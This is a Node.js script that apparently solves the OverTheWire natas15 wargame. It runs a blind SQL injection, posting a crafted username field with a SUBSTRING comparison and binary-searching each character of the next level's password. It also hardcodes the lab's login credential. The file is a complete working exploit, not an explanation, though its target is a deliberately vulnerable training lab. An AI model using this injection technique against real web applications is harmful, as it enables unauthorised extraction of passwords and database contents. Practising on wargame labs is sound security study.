const fetch = require('node-fetch');
const url = "http://natas15.natas.labs.overthewire.org/?debug";
const user = "natas15";
const pass = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
const FormData = require('form-data');

const authorization = "Basic " + Buffer.from(user + ":" + pass).toString('base64');

let allowedChars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
let findme = 'hot';

const postToServer = async (char, poisiton = 0, sign = '>') => {
    const data = new FormData();
    data.append("username", `natas16" and SUBSTRING(password,${poisiton}, 1) ${sign} BINARY "${char}`);

    const res = await fetch(url, {
        method: 'POST',
        headers: {
            "Authorization": authorization,
        },
        body: data
    });
    const result = await res.text();
    //console.log(result);
    return result.indexOf('This user exists.') >= 0;
}

let postToServerDummy = async (char, poisiton = 0, sign = '>') => {
    return await postToServer(char, poisiton, sign);
    return eval(`findme[${poisiton}] ${sign} char`);
}

(async () => {

    for (pos = 1; pos < 33; pos++) {

    let rangeFrom = 0;
    let rangeTo = allowedChars.length;
    let middle = null;

    for (let i = 0; i < 4; i++) {
        middle = Math.floor((rangeFrom + rangeTo) / 2);
        if (await postToServerDummy(allowedChars[middle], pos, '>')) {
            rangeFrom = middle;
        } else {
            rangeTo = middle;
        }
    }

    let result = allowedChars[rangeTo];
    for (let i = rangeFrom; i < rangeTo; i++) {
        if (await postToServerDummy(allowedChars[i], pos, '=')) {
            result = allowedChars[i];
            break;
        }
    }

    process.stdout.write(result);
    }

    console.log();


})();